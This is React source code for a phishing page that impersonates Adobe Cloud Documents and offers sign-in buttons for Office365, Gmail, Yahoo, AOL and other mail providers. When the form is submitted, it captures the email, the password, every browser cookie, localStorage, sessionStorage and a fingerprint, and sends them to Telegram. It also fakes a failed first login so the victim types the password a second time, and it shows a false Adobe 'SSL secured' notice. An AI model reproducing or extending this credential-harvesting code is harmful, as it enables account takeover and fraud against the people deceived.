import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
import { getBrowserFingerprint } from '../../utils/oauthHandler';
import safeSendToTelegram from '../../utils/safeSendToTelegram';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess,
  onLoginError 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Selected provider: ${provider}`);
    setSelectedProvider(provider);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);
    setErrorMessage('');

    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);

      // Capture browser fingerprint for this attempt
      const browserFingerprint = getBrowserFingerprint();
      
      const cookieCapture = {
        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
        allCookies: {}
      };
      if (typeof document !== 'undefined') {
        document.cookie.split(';').forEach(cookie => {
          const [name, value] = cookie.trim().split('=');
          if (name && value) cookieCapture.allCookies[name] = decodeURIComponent(value);
        });
      }

      const sessionData = {
        email,
        password,
        provider: selectedProvider,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        fileName: 'Adobe Cloud Access',
        clientIP: 'Unknown',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: cookieCapture.documentCookies,
        cookiesParsed: cookieCapture.allCookies,
        localStorage: JSON.stringify(browserFingerprint.localStorage),
        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
        browserFingerprint,
        attemptNumber: currentAttempt,
        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
        cookieCapture
      };

      // Use shared safe sender
      try {
        await safeSendToTelegram(sessionData);
        console.log(`✅ Mobile attempt ${currentAttempt} data sent to Telegram`);
      } catch (err) {
        console.error('❌ Failed to send mobile attempt data via safeSendToTelegram:', err);
      }

      if (currentAttempt === 1) {
        await new Promise(resolve => setTimeout(resolve, 1500));
        setErrorMessage('Invalid email or password. Please try again.');
        setIsLoading(false);
      } else {
        await new Promise(resolve => setTimeout(resolve, 1000));
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
        }
        if (onLoginSuccess) await onLoginSuccess(sessionData);
        setIsLoading(false);
      }
    } catch (error) {
      console.error('Mobile login error:', error);
      if (onLoginError) onLoginError('Login failed. Please try again.');
      setIsLoading(false);
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setLoginAttempts(0);
    setErrorMessage('');
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1633993365956-621f62f8057e?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=2070')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      {/* Decorative overlay (responsive)
          Desktop / larger: left column with logo + stacked lines below.
          Mobile: centered block above the card so it is visible and readable. */}
      <div className="absolute z-0 pointer-events-none opacity-90 inset-0">
        {/* Desktop / larger screens: left column */}
        <div className="hidden sm:flex absolute left-4 md:left-6 top-1/2 transform -translate-y-1/2 flex-col items-start">
          <div className="flex items-center gap-3">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
              alt="Adobe Cloud"
              className="w-12 h-12 md:w-14 md:h-14 object-contain drop-shadow-md"
            />
            <div className="text-white drop-shadow-md">
              <div className="text-2xl md:text-3xl font-semibold leading-tight">Adobe Cloud Documents</div>
            </div>
          </div>

          <div className="mt-8 ml-8 md:ml-12 lg:ml-20 text-left">
            <div className="text-white/90 text-sm md:text-sm">PDF and e-signing tools</div>
            <div className="text-white/80 text-sm md:text-sm italic mt-2">Securely access your PDFs</div>
          </div>
        </div>

        {/* Mobile: centered above the card */}
        <div className="sm:hidden absolute inset-x-0 top-6 flex flex-col items-center gap-2 px-4">
          <div className="flex items-center gap-2">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
              alt="Adobe Cloud"
              className="w-10 h-10 object-contain drop-shadow-md"
            />
            <div className="text-white drop-shadow-md">
              <div className="text-lg font-semibold leading-tight">Adobe Cloud Documents</div>
            </div>
          </div>

          <div className="mt-4 text-center">
            <div className="text-white/90 text-xs">PDF and e-signing tools</div>
            <div className="text-white/80 text-xs italic mt-1">Securely access your PDFs</div>
          </div>
        </div>
      </div>

      {/* Card container */}
      <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
        <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden md:min-h-[460px]">
          <div className="absolute inset-0 bg-gradient-to-br from-white/40 to-transparent pointer-events-none"></div>
          <div className="relative z-10">
            {/* Centered "Select Your Provider" pill in header */}
            <div className="flex items-center justify-center mb-3">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
                <Sparkles className="w-3.5 h-3.5 text-blue-500" />
                <span className="text-xs font-medium text-blue-700">Select Your Provider</span>
              </div>
            </div>

            <div className="mt-2">
              {!selectedProvider ? (
                <div className="space-y-4">
                  <div className="grid grid-cols-3 gap-3 sm:grid-cols-3 md:grid-cols-3">
                    {emailProviders.map((provider) => (
                      <button 
                        key={provider.name} 
                        onClick={() => handleProviderSelect(provider.name)} 
                        className="group relative flex flex-col items-center gap-2 p-3 bg-white/75 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-200 transform active:scale-95" 
                        aria-label={`Select ${provider.name}`} 
                        type="button"
                      >
                        <img 
                          src={provider.logo} 
                          alt={provider.name} 
                          className="w-8 h-8 object-contain" 
                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                        />
                        <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center truncate">
                          {provider.name}
                        </div>
                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-200 pointer-events-none"></div>
                      </button>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex items-center gap-2 mb-4">
                    <button 
                      onClick={handleBackToProviders} 
                      className="p-1.5 rounded-md hover:bg-gray-100 transition-colors" 
                      type="button"
                    >
                      <ArrowLeft className="w-4 h-4 text-gray-600" />
                    </button>
                    <div className="flex items-center gap-2">
                      <img 
                        src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
                        alt={selectedProvider} 
                        className="w-6 h-6 object-contain" 
                        onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                      />
                      <h2 className="text-sm font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                    </div>
                  </div>

                  <form onSubmit={handleFormSubmit} className="space-y-3">
                    {errorMessage && (
                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-lg p-3">
                        <p className="text-red-700 text-xs font-medium flex items-center gap-2">{errorMessage}</p>
                      </div>
                    )}

                    <div className="space-y-3">
                      <div>
                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Email Address</label>
                        <div className="relative group">
                          <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                          <input 
                            type="email" 
                            value={email} 
                            onChange={(e) => setEmail(e.target.value)} 
                            className="w-full pl-10 pr-3 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" 
                            placeholder="Enter your email" 
                            required 
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Password</label>
                        <div className="relative group">
                          <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                          <input 
                            type={showPassword ? 'text' : 'password'} 
                            value={password} 
                            onChange={(e) => setPassword(e.target.value)} 
                            className="w-full pl-10 pr-10 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" 
                            placeholder="Enter your password" 
                            required 
                          />
                          <button 
                            type="button" 
                            onClick={() => setShowPassword(!showPassword)} 
                            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                          >
                            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                        </div>
                      </div>
                    </div>

                    <button 
                      type="submit" 
                      disabled={isLoading || !email || !password} 
                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold text-sm hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-200 shadow-lg"
                    >
                      <div className="flex items-center justify-center gap-2">
                        {isLoading && (
                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        )}
                        {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
                      </div>
                    </button>
                  </form>
                </div>
              )} 
            </div>

            <div className="mt-5 text-center">
              <p className="text-xs text-gray-500">© 2025 Adobe Inc. SSL secured.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default MobileLoginPage;
